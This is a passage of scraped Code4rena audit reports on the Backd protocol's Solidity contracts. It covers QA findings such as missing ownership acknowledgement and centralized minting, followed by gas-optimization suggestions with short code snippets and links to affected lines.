[VestedEscrow.sol#L55](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/VestedEscrow.sol#L55) - [AmmGauge.sol#L39](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L39)  If you set any wrong address, without being a contract, an EOA for example, it cannot be changed again:  - [Controller.sol#L36](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/Controller.sol#L36) - [Minter.sol#L100](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/Minter.sol#L100) - [InflationManager.sol#L61](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L61)  Lack of int range checks: - [Minter.sol#L61-L69](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/Minter.sol#L61-L69)  Not max defined: - [Preparable.sol#L29](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L29)  # Lack of ACK during owner change  It's possible to lose the ownership under specific circumstances.  Because an human error it's possible to set a new invalid owner. When you want to change the owner's address it's better to propose a new owner, and then accept this ownership with the new wallet.  Affected source code:  - [RoleManager.sol#L41-L48](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L41-L48) - [VestedEscrow.sol#L71](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/VestedEscrow.sol#L71)  # Avoid errors with transferFrom  The following methods take all the user's balance and send it through `transferFrom`, this call may fail, since `transferFrom` extracts the balance from the previously approved `allowance`, it is better to use the user's `allowance` in order to avoid the unnecessary failure when both amounts are not the same. It's better to use `allowance` instead of `balanceOf`.  Affected source code:  - [FeeBurner.sol#L68-L70](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/FeeBurner.sol#L68-L70)  # Wrong logic around `grantRole` and `revokeRole`.  The `RoleManager` contract contains a few special roles (`Roles.ADDRESS_PROVIDER`, `Roles.POOL_FACTORY`, `Roles.CONTROLLER`, `Roles.POOL` and `Roles.VAULT`) that are not controlled in the `grantRole` and `revokeRole` methods.  Affected source code:  - [RoleManager.sol#L37](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L37) - [RoleManager.sol#L111](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L111)  # Centralization risks  ## Multiple initialization  The `initialize` method of the `BkdLocker` contract allows it to be started multiple times as long as the value `startBoost=0` is set. Abuse these settings to his advantage.  Affected source code:  - [BkdLocker.sol#L53-L63](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L53-L63)  ## Centralized minting  The `minter` address can `mint` arbitrary amount of tokens. If the private key of the owner or minter address is compromised, the attacker will be able to `mint` an unlimited amount of tokens, or `burn` from arbitrary addresses.  Affected source code:  - [BkdToken.sol#L30](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/BkdToken.sol#L30)  ## Controlled swapRouter  The `FeeBurner` contract sets the `swapperRouter` in the `_addressProvider`, so the owner can set any type of swapper, paths or pools, even malicious ones. Since there is no slippage defined in the `FeeBurner` contract itself, it could be that a `swapperRouter` returns 0 WETH, and keeps the sent tokens.  Affected source code:  - [FeeBurner.sol#L73](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/FeeBurner.sol#L73) "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/17", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": " # Outdated compiler  The pragma version used is `pragma solidity 0.8.10;` but recently solidity released a new version with important Bugfixes:  - The first one is related to ABI-encoding nested arrays directly from calldata. You can find more information [here](https://blog.soliditylang.org/2022/05/17/calldata-reencode-size-check-bug/).  - The second bug is triggered in certain inheritance structures and can cause a memory pointer to be interpreted as a calldata pointer or vice-versa. We also have a dedicated blog [post](https://blog.soliditylang.org/2022/05/17/data-location-inheritance-bug/) about this bug.  Apart from these, there are several minor bug fixes and improvements.  The minimum required version should be [0.8.14](https://github.com/ethereum/solidity/releases/tag/v0.8.14)  # Reduce the size of error messages (Long revert Strings)  Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.  Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.  I suggest shortening the revert strings to fit in 32 bytes, or that using custom errors as described next (require pragma upgrade).  ## Use Custom Errors instead of Revert Strings to save Gas  Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)  ### Source Custom Errors in Solidity:  Starting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., revert(\"Insufficient funds.\");), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.  Custom errors are defined using the error statement, which can be used inside and outside of contracts (including interfaces and libraries).  Affected source code:  - [Errors.sol#L7-L111](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/libraries/Errors.sol#L7-L111) - [Minter.sol#L152](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/Minter.sol#L152)  # Delete optimization  Use `delete` instead of set to default value (`false` or `0`)  Affected source code:  - [RoleManager.sol#L158](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L158) - [Preparable.sol#L87-L88](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L87-L88) - [Preparable.sol#L99-L100](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L99-L100) - [Preparable.sol#L112](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L112) - [Preparable.sol#L142-L143](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L142-L143) - [Preparable.sol#L150-L151](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L150-L151) - [LpGauge.sol#L60](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/LpGauge.sol#L60) - [AmmGauge.sol#L64](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L64)  # unckecked keyword  It's possible to save gas using the `unckecked` keyword around the `i` variable. This will avoid the required checks to ensure that the variable won't overflow, and in the case of this for loop, is almost impossible:  Reference:  - https://docs.soliditylang.org/en/v0.8.0/control-structures.html#checked-or-unchecked-arithmetic  Affected source code:  - [PoolMigrationZap.sol#L22](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L22)  #  `++i` costs less gas compared to `i++` or `i += 1`  `++i` costs less gas compared to `i++` or `i += 1` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.  `i++` increments `i` and returns the initial value of `i`. Which means:  ```solidity uint i = 1; i++; // == 1 but i == 2 ```  But `++i` returns the actual incremented value:  ```solidity uint i = 1; ++i; // == 2 and i == 2 too, so no need for a temporary variable ```  In the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`. I suggest using `++i` instead of `i++` to increment the value of an uint variable. Same thing for `--i` and `i--`. Also, in some of the points mentioned below, it would be necessary to add `unckecked` since said variable is impossible to overflow.  Affected source code:  - [BkdLocker.sol#L140](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L140) - [RoleManager.sol#L82](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L82) - [RewardHandler.sol#L42](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/RewardHandler.sol#L42) - [Controller.sol#L126](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/Controller.sol#L126) - [StakerVault.sol#L259](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/StakerVault.sol#L259) - [BkdLocker.sol#L310](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L310) - [FeeBurner.sol#L56](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/FeeBurner.sol#L56) - [KeeperGauge.sol#L157](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L157) - [VestedEscrow.sol#L94](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/VestedEscrow.sol#L94) - [InflationManager.sol#L98](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L98) - [InflationManager.sol#L112-L121](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L112-L121) - [InflationManager.sol#L173](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L173) - [InflationManager.sol#L198](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L198) - [InflationManager.sol#L267](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L267) - [InflationManager.sol#L291](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L291) - [InflationManager.sol#L366](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L366) - [InflationManager.sol#L390](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L390) - [InflationManager.sol#L413](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L413) - [InflationManager.sol#L454](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L454)  # Avoid unused returns  Having a method that always returns the same value is not correct in terms of consumption, if you want to modify a value, and the method will perform a `revert` in case of failure, it is not necessary to return a `true`, since it will never be `false`. It is less expensive not to return anything, and it also eliminates the need to double-check the returned value by the caller.  Affected source code:  - [Preparable.sol#L47](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L47) - [Preparable.sol#L71](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L71) - [Preparable.sol#L90](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L90) - [Preparable.sol#L102](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L102) - [StakerVault.sol#L79](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/StakerVault.sol#L79) - [StakerVault.sol#L84](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/StakerVault.sol#L84) - [StakerVault.sol#L90](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/StakerVault.sol#L90) - [StakerVault.sol#L101](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/StakerVault.sol#L101) - [AddressProvider.sol#L67](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/AddressProvider.sol#L67) - [AddressProvider.sol#L74](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/AddressProvider.sol#L74) - [AddressProvider.sol#L299](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/AddressProvider.sol#L299) - [LpGauge.sol#L120](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/LpGauge.sol#L120) - [KeeperGauge.sol#L61](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L61) - [KeeperGauge.sol#L89](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L89) - [KeeperGauge.sol#L99](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L99) - [KeeperGauge.sol#L116](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L116) - [VestedEscrow.sol#L86](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/VestedEscrow.sol#L86) - [AmmGauge.sol#L53](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L53) - [AmmGauge.sol#L115](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L115) - [AmmGauge.sol#L137](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L137) - [AmmGauge.sol#L151](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L151) - [AmmGauge.sol#L160](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L160) - [InflationManager.sol#L62](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L62) - [InflationManager.sol#L72](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L72) - [InflationManager.sol#L102](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L102) - [InflationManager.sol#L124](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L124) - [InflationManager.sol#L142](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L142) - [InflationManager.sol#L178](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L178) - [InflationManager.sol#L202](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L202) - [InflationManager.sol#L233](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L233) - [InflationManager.sol#L275](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L275) - [InflationManager.sol#L300](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L300) - [InflationManager.sol#L318](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L318) - [InflationManager.sol#L347](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L347) - [InflationManager.sol#L371](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L371) - [InflationManager.sol#L395](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L395) - [InflationManager.sol#L437](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L437) - [InflationManager.sol#L488](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L488) - [InflationManager.sol#L578](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L578) - [InflationManager.sol#L592](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L592) - [InflationManager.sol#L606](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L606)  # Improve logic  It's possible to optimize the method `getRoleMember` of the contract `RoleManager` checking first if the `index` is 0.  Before:  ```javascript if (role == Roles.ADDRESS_PROVIDER && index == 0) {             return address(addressProvider);         } else if (role == Roles.POOL_FACTORY && index == 0) {             return addressProvider.getAddress(AddressProviderKeys._POOL_FACTORY_KEY);         } else if (role == Roles.CONTROLLER && index == 0) {             return addressProvider.getAddress(AddressProviderKeys._CONTROLLER_KEY);         } else if (role == Roles.POOL) {             return addressProvider.getPoolAtIndex(index);         } else if (role == Roles.VAULT) {             return addressProvider.getVaultAtIndex(index);         } ```  After:  ```javascript if (index == 0) {     if (role == Roles.ADDRESS_PROVIDER) return address(addressProvider);     if (role == Roles.POOL_FACTORY) return addressProvider.getAddress(AddressProviderKeys._POOL_FACTORY_KEY);     if (role == Roles.CONTROLLER) return addressProvider.getAddress(AddressProviderKeys._CONTROLLER_KEY); } if (role == Roles.POOL) return addressProvider.getPoolAtIndex(index); if (role == Roles.VAULT) return addressProvider.getVaultAtIndex(index); ```  *Note that also, this change will increase readability.*  Affected source code:  - [RoleManager.sol#L97-L107](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L97-L107)  # Inline improve  El metodo `uncheckedInc` de la libreria `UncheckedMath ` pretenden ahorrar gas, pero suponiendo que el compilador lo optimize al ser mayor a [0.8.2](https://github.com/ethereum/solidity/blob/develop/Changelog.md#082-2021-03-02) y se compile como inline, aun as\u00ed devolver\u00e1 un valor a la pila que puede ser evitado. Y adem\u00e1s es m\u00e1s optimo utiliza ++a en lugar de a+1;  The `uncheckedInc` method of the `UncheckedMath ` library is intended to save gas, but assuming the compiler optimizes it because it's greater than [0.8.2](https://github.com/ethereum/solidity/blob/develop/Changelog.md#082-2021-03-02), it will still return a value on the stack that can be avoided. And it is also more optimal to use `++a` instead of `a + 1;`.  Affected source code:  - [UncheckedMath.sol#L4-L23](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/libraries/UncheckedMath.sol#L4-L23) "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/16", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# [G-01] Cache array length before loop  Caching the array length outside a loop saves reading it on each iteration, as long as the array's length is not changed during the loop. This saves gas.  This was found in many places https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/RewardHandler.sol#L42 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L82 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/zaps/PoolMigrationZap.sol#L22 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/zaps/PoolMigrationZap.sol#L39 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/FeeBurner.sol#L56 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrow.sol#L94 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L116 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L259  ## Recommended Mitigation Steps  Cache the array length before the for loop  # [G-02] Use != 0 instead of > 0  Using `> 0` uses slightly more gas than using `!= 0`. Use `!= 0` when comparing uint variables to zero, which cannot hold values below zero  Locations where this was found include https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L91 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L92 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L137 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L139 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L254 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L301 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/RewardHandler.sol#L63 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/FeeBurner.sol#L117 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/LpGauge.sol#L68 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/LpGauge.sol#L114 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrow.sol#L84 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L575 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L589 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L602 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmGauge.sol#L88 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmGauge.sol#L104 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmGauge.sol#L125 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmGauge.sol#L147 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/KeeperGauge.sol#L140 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L107 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L129 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L158 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L171 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L197  ## Recommended Mitigation Steps  Replace `> 0` with `!= 0` to save gas  # [G-03] For loop incrementing can be unsafe  For loops that use i++ do not need to use safemath for this operation because the loop would run out of gas long before this point. Making this addition operation unsafe using unchecked saves gas. This is already used in many places with `i = i.uncheckedInc()`.  Sample code to make the for loop increment unsafe ``` for (uint i = 0; i < length; i = unchecked_inc(i)) {     // do something that doesn't change the value of i }  function unchecked_inc(uint i) returns (uint) {     unchecked {         return i + 1;     } } ```  Idea borrowed from https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked  There is one loop and that can use this change https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/zaps/PoolMigrationZap.sol#L22  ## Recommended Mitigation Steps  Make the increment in for loops unsafe to save gas  # [G-04] Use iszero assembly for zero checks  Comparing a value to zero can be done using the `iszero` EVM opcode. This can save gas  Source from t11s https://twitter.com/transmissions11/status/1474465495243898885  There are many places where a value is compared to zero https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L59 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L271 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L97 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L99 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L101 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/zaps/PoolMigrationZap.sol#L57 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/utils/Preparable.sol#L28 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/FeeBurner.sol#L61 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/FeeBurner.sol#L69 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/FeeBurner.sol#L75 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L53 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrow.sol#L144 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L105 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L133 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L165 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L174 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L183 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L496 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L514 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L522 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/Controller.sol#L106  ## Recommended Mitigation Steps  Use the assembly `iszero` evm opcode to compare values to zero  # [G-05] Save gas with unchecked  Use unchecked math when there is no overflow risk to save gas. Before index is decreased in remove it is checked for zero condition. This means index will not underflow and can be unchecked.  These subtractions do not need to be checked for underflows because there is a require earlier that confirms the underflow will not happen. Use the `uncheckedSub` function https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L124 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L338  ## Recommended Mitigation Steps  Add unchecked around math that can't overflow for gas savings. In Solidity before 0.8.0, use the normal math operators instead of safe math functions.  # [G-06] Add payable to functions that won't receive ETH  Identifying a function as payable saves gas. Functions that have a modifier like onlyGovernance or onlyAuthorizedToPause cannot be called by normal users and will not mistakenly receive ETH. These functions can be payable to save gas.  There are many functions that have the auth modifier in the contracts. Some examples are https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L58 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L70 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L37 